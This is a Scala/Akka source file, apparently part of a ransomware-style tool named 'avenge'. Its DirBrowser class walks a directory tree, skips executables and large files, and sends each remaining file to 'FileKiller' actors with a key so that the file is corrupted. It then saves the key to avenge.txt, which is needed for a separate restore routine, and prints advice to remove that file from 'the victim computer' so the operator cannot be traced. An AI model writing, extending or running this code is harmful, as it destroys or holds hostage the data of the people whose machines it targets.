package beep02.avenge.destroy

import akka.actor.Actor
import Messages._
import akka.actor.ActorRef
import java.nio.file.Files
import java.nio.file.Paths
import java.io.File
import beep02.avenge.Shotgun
import akka.actor.Props
import java.nio.file.Path
import scala.collection.JavaConversions._
import scala.collection.mutable.HashMap
import akka.event.LoggingReceive
import scala.collection.mutable.LinkedList



class DirBrowser extends Actor{
   
   val reports  = new HashMap[String,(Int,Int)]
   var track = false
  
   def receive = LoggingReceive{
        case s: StartDesrroy => destroy(s)
        case s: StartRestore => restore(s)
        case r: DestroyReport =>  saveReport(r)
        case r: RestoreReport =>  saveReport(r)
        case s: Stop => stop(s.key,s.dir)
        case other =>println("unknown message "+other + " in DirBrowser")
   }
   
   def saveReport(r: DestroyReport){
        println("destroy report:"+r)
        reports(r.path)=(r.status, r.length)
   }
   
   def saveReport(r: RestoreReport){
        println("restore report:"+r)
        reports(r.path)=(r.status,0)
   }
   
   def messup(f: File, k: String, l:Int): Unit = {
        val killer = Shotgun.system.actorOf(Props(new FileKiller), "fileKillingActor_"+l)
        reports+=(f.getAbsolutePath -> Tuple2(-1, 0))
        killer ! new Task(1, f, k, self, 0)
   }
   
   def restore(f: File, k: String, l:Int, length:Int): Unit = {
        val restorer = Shotgun.system.actorOf(Props(new FileKiller), "fileRestoringActor_"+l)
        reports+=(f.getAbsolutePath-> Tuple2(-1, 0))
        restorer ! new Task(0, f, k, self, length)
   }
   
   def tracking(key: Option[String], dir:Option[File]):Unit={
        val tracker = Shotgun.system.actorOf(Props(new Tracking), "tracker")
        tracker ! Track(reports, key, dir)
   }
   
   def stop(key: Option[String], dir:Option[File]){
     if(key != None){
       
       val myList = reports.keysIterator.toList
       val newList = new Array[String](myList.size)
       for((v,i) <- myList.zipWithIndex){
            newList(i) = v + ";" + reports(v)._2
       }
       val allList:List[String]  = key.get :: newList.toList
       
       Files.write(Paths.get(dir.get.getAbsolutePath,"avenge.txt"),allList)
       println("Important!!!")
       println("Important!!!")
       println("Important!!!")
       println("Find the key file under the directory:"+dir.get.getAbsolutePath)
       println("it's name is avenge.txt")
       println("Save the file, without this file you would be unable to restore corrupted files")
       println("Do not forget to delete avenge.txt file from the victim computer - otherwise they can track you!")
       println("we are done")
       
     }else{
       println("we are done with restore")  
     }
     Shotgun.system.shutdown
     Thread.sleep(1000)
     println("have a nice antisocial day!")
     System.exit(0);
   }
   
   def destroy(start:StartDesrroy):Unit={
     track = true
     val dir = start.bullets._1
     val key = start.bullets._2
     recursiveKilling(messup, dir.get, key.get, 0);
     println("starting tracking...")
     tracking(key,dir)
   }
   
   def restore(start:StartRestore):Unit={
     track = true
     val avengeFile = start.bullets._3.get
     if(!new File(avengeFile).exists){
         println("The path "+ avengeFile + " is not a valid file. Execution aborted.")
         System.exit(0)
     }
     val lines = Files.readAllLines(Paths.get(avengeFile))
     val key = lines.get(0)
     val paths = lines.subList(1, lines.size())
     flatRestoring(restore, key, paths.toList)
     println("starting tracking...")
     tracking(None, None)
   }
   
   def flatRestoring (restoreFunc:(File, String, Int, Int) => Unit, key:String, lines: List[String]):Unit={
       for((x , i) <- lines.zipWithIndex) {
         val splitted = x.split(";")
         restoreFunc(new File(splitted(0)), key , i, splitted(1).toInt)
       }
   }
   
   def recursiveKilling (killFunc: (File, String, Int) => Unit, file: File, key: String, level:Int):Unit={
        println("Directory:"+file.getAbsoluteFile + ", list files:")
        for(f <- file.listFiles){
            if(f.isDirectory()){
               recursiveKilling(killFunc,f,key, level+1)
            }else{
               if(f.canWrite() && f.canRead()){
                   //skip executables and libs
                   val appropriate = f.getName.dropWhile(_ != '.') match {
                      case ".exe"   => false
                      case ".dll"   => false
                      case ".jar"   => false
                      case ".class" => false
                      case ".bin"   => false
                      case ".sh"    => false
                      case ".sys"   => false
                      case ".inf"   => false
                      case ".app"   => false
                      case ".run"   => false
                      case other => true //a lot of executables still exist here, but to hell with them!
                   }
                   val size = f.length
                   if (appropriate && size < 1024*1000*10/*avoid file > 10 Mb*/) {
                       println("file : "+f.getName + "  is to kill")
                       killFunc(f, key, level)
                   }
                }
            }
        }
   }
   
}